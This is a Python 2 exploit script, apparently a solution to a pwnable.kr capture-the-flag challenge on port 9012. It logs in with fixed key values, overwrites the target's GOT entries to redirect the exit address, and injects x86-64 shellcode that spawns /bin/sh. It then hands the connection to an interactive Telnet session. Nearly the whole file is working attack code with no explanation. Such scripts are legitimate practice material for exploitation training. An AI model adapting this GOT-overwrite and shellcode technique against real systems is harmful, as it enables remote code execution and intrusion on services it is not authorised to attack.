from socket import *
from telnetlib import *
import time, struct

p = lambda x: struct.pack("<Q", x)
up = lambda x: struct.unpack("<Q", x)[0]

HOST = 'pwnable.kr'
PORT = 9012

data = ["3d130000610c000006130000f7030000f7030000611000001e0d000006130000ba2e00003d1300000613000004060000b10d0000c327000078290000",
        "3d130000610c00006f1a0000040600000b1b0000040600000613000000190000ba2e00003d130000061300006f1a0000b10d0000c327000078290000"]

shellcode = "\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e" + \
            "\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05"
key = [107, 113, 13, 3653]

s = socket(AF_INET, SOCK_STREAM)
s.connect((HOST, PORT))

time.sleep(0.3)
print s.recv(1024)

s.send("1\n")
time.sleep(0.3)
print s.recv(1024)

for i in range(4):
    s.send(str(key[i]) + "\n")
    time.sleep(0.1)
    print s.recv(1024)

# Change GOT Table
s.send("3\n")
time.sleep(0.3)
s.send("1024\n")
time.sleep(0.3)
s.send(data[0] + "\n")
print "[*] Create GOT Complete"
time.sleep(10)
s.send("3\n")
time.sleep(0.3)
s.send("1024\n")
time.sleep(0.3)
s.send(data[1] + "\n")
print "[*] Change Exit Address Complete"
time.sleep(10)

# Send ShellCode
s.send("2\n")
time.sleep(0.3)
s.send("1024\n")
time.sleep(0.3)
s.send(shellcode + "\n")
time.sleep(0.3)

s.send("5\n")
time.sleep(2)

t = Telnet()
t.sock = s

t.interact()